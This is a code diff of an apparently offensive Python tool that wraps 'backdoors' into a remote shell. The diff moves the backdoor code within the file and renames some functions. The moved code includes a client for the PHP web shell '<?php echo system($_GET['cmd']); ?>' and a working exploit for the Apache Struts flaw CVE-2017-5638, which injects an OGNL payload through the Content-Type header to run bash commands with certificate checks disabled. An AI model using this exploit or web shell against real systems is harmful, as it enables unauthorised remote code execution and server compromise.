@@ -2,11 +2,6 @@
 
 from abc import ABCMeta, abstractmethod
 from base64 import b64encode
-import requests
-from requests.packages.urllib3 import disable_warnings
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-disable_warnings(InsecureRequestWarning)
 
 class Backdoor(metaclass=ABCMeta):
     def __init__(self, url):
@@ -19,74 +14,6 @@ class Backdoor(metaclass=ABCMeta):
     @abstractmethod
     def system(self, command):
         pass
-
-_BACKDOOR = {}
-def backdoor(name):
-    def _backdoor(clazz):
-        assert issubclass(clazz, Backdoor)
-        _BACKDOOR[name] = clazz
-        return clazz
-    return _backdoor
-
-@backdoor('local')
-class LocalBackdoor(Backdoor):
-    def __init__(self, url):
-        super().__init__(url)
-
-    def system(self, command):
-        import subprocess
-        proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        return proc.stdout
-
-@backdoor('php')
-class PhpBackdoor(Backdoor):
-    """
-        <?php echo system($_GET['cmd']); ?>
-    """
-    def __init__(self, url):
-        super().__init__(url)
-
-    def system(self, command):
-        params = { 'cmd' : command }
-
-        response = requests.get(self.url, params=params, verify=False)
-        text = response.text
-
-        return text
-
-@backdoor('CVE-2017-5638')
-class CVE_2017_5638(Backdoor):
-    def __init__(self, url):
-        super().__init__(url)
-
-    def system(self, command):
-        payload = ""
-        payload += "%{(#_='multipart/form-data')."
-        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
-        payload += "(#_memberAccess?"
-        payload += "(#_memberAccess=#dm):"
-        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
-        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
-        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
-        payload += "(#ognlUtil.getExcludedClasses().clear())."
-        payload += "(#context.setMemberAccess(#dm))))."
-        payload += f"(#cmd='{command}')."
-        payload += "(#cmds={'/bin/bash','-c',#cmd})."
-        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
-        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
-        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
-        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
-        payload += "(#ros.flush())}"
-
-        headers = {
-                'Content-Type': payload,
-                'Accept': '*/*'
-        }
-
-        response = requests.get(self.url, headers=headers, verify=False)
-        text = response.text
-
-        return text
 
 class Shell(Backdoor):
     def __init__(self, backdoor, inpath, outpath):
@@ -157,6 +84,84 @@ class Bash(Shell):
     def clear(self):
         pass
 
+
+
+
+
+import requests
+from requests.packages.urllib3 import disable_warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+disable_warnings(InsecureRequestWarning)
+
+_BACKDOOR = {}
+def backdoor(name):
+    def _backdoor(clazz):
+        assert issubclass(clazz, Backdoor)
+        _BACKDOOR[name] = clazz
+        return clazz
+    return _backdoor
+
+@backdoor('local')
+class LocalBackdoor(Backdoor):
+    def __init__(self, url):
+        super().__init__(url)
+
+    def system(self, command):
+        import subprocess
+        proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        return proc.stdout
+
+@backdoor('php')
+class PhpBackdoor(Backdoor):
+    """
+        <?php echo system($_GET['cmd']); ?>
+    """
+    def __init__(self, url):
+        super().__init__(url)
+
+    def system(self, command):
+        params = { 'cmd' : command }
+
+        response = requests.get(self.url, params=params, verify=False)
+        text = response.text
+
+        return text
+
+@backdoor('CVE-2017-5638')
+class CVE_2017_5638(Backdoor):
+    def __init__(self, url):
+        super().__init__(url)
+
+    def system(self, command):
+        payload = ""
+        payload += "%{(#_='multipart/form-data')."
+        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+        payload += "(#_memberAccess?"
+        payload += "(#_memberAccess=#dm):"
+        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+        payload += "(#ognlUtil.getExcludedClasses().clear())."
+        payload += "(#context.setMemberAccess(#dm))))."
+        payload += f"(#cmd='{command}')."
+        payload += "(#cmds={'/bin/bash','-c',#cmd})."
+        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+        payload += "(#ros.flush())}"
+
+        headers = {
+                'Content-Type': payload,
+                'Accept': '*/*'
+        }
+
+        response = requests.get(self.url, headers=headers, verify=False)
+        text = response.text
+
+        return text
+
 if __name__ == '__main__':
     from argparse import ArgumentParser
     from os import environ
@@ -200,18 +205,18 @@ if __name__ == '__main__':
             shell = Bash(backdoor, args.inpath, args.outpath)
 
         if not args.skip:
-            def setup_task(shell):
+            def task1(shell):
                 try:
                     shell.setup()
                 except Exception as e:
                     print(f'SETUP_ERROR: {e}', file=stderr)
 
-            thread1 = Thread(target=setup_task, args=[shell])
+            thread1 = Thread(target=task1, args=[shell])
             thread1.setDaemon(True)
             thread1.start()
             sleep(2)
 
-        def read_task(shell, interval):
+        def task2(shell, interval):
             while True:
                 try:
                     contents = shell.read()
@@ -222,7 +227,7 @@ if __name__ == '__main__':
                     print(f'READ_ERROR: {e}', file=stderr)
                 sleep(interval)
 
-        thread2 = Thread(target=read_task, args=[shell, args.interval])
+        thread2 = Thread(target=task2, args=[shell, args.interval])
         thread2.setDaemon(True)
         thread2.start()
 
